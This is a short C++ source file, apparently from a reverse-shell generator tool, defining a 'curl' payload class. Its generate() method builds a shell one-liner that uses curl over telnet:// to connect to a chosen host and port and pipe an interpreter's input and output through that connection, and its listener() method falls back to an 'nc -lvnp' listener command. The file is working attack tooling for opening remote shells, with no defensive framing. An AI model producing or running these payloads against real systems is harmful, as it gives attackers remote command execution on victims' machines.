#include "Curl_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string CurlPayload::name() const {
return "curl";
}

std::string CurlPayload::generate(const Options& opts) const {
    return "C='curl -Ns telnet://" + opts.host + ":" + std::to_string(opts.port) + "'; $C </dev/null 2>&1 | " + opts.interpreter + " 2>&1 | $C >/dev/null";
}

std::string CurlPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}